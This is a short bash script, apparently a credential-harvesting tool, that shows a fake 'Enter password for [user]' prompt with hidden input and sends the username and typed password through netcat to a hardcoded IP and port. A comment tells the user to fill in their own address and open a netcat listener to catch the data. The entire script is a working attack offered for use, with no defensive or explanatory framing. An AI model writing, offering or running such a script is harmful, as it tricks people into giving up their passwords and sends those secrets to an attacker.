#!/bin/bash


#REPLACE WITH OWN INFO AND OPEN A NETCAT LISTENER ON PORT : "nc -lvnp <port>"
PORT=4095
IP="192.168.56.50"

#get current user
CURRENT_USER=$(id -un)

#ask for user input
read -rsp "Enter password for [$CURRENT_USER]: " pass
echo

#send input to user on port
echo "$CURRENT_USER:$pass" | nc -q 1 "$IP" "$PORT"
